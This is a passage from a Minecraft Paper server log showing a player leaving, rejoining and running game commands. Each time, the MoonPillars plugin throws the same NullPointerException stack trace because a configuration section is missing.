	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:15:55] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:15:55] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:15:55] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:16:22] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:17:39] [Server thread/INFO]: JustCheburek issued server command: /kill
[14:17:39] [Server thread/INFO]: [JustCheburek: Killed JustCheburek]
[14:18:06] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:18:06] [Server thread/WARN]: No config found for player: JustCheburek
[14:18:30] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:18:30] [Server thread/WARN]: No config found for player: JustCheburek
[14:18:32] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:18:32] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:18:32] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:20:27] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:20:27] [Server thread/WARN]: No config found for player: JustCheburek
[14:20:33] [Server thread/INFO]: JustCheburek lost connection: Disconnected
[14:20:33] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:20:33] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnLeave(MoonLab.java:72) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor201.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:20:33] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:20:33] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.onLeave(GameManager.java:986) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor222.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:20:33] [Server thread/INFO]: [MoonPillars] [STDOUT] DELETE Response: Offline player deleted successfully.
[14:20:33] [Server thread/WARN]: Nag author(s): '[Kloppie74]' of 'MoonPillars v5.2.2' about their usage of System.out/err.print. Please use your plugin's logger instead (JavaPlugin#getLogger).
[14:20:34] [Server thread/INFO]: [NoChatReports] Forgetting player: JustCheburek
[14:21:59] [User Authenticator #4/INFO]: UUID of player JustCheburek is 168fa541-313e-44b2-beaa-5bebf9595e28
[14:22:00] [Server thread/ERROR]: Could not pass event PlayerJoinEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnJoin(MoonLab.java:98) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor202.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.placeNewPlayer(PlayerList.java:347) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConfigurationPacketListenerImpl.handleConfigurationFinished(ServerConfigurationPacketListenerImpl.java:173) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:22) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:13) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:22:00] [Server thread/INFO]: [NoChatReports] Setting up player: JustCheburek
[14:22:00] [Server thread/INFO]: JustCheburek[/109.126.59.118:37860] logged in with entity id 55 at ([world]-75.5, 111.0, -16.5)
[14:22:38] [Thread-17/INFO]: [MoonPillars] - Found save in Commands.yml, Reloading file automatic!
[14:22:43] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:22:43] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:22:43] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
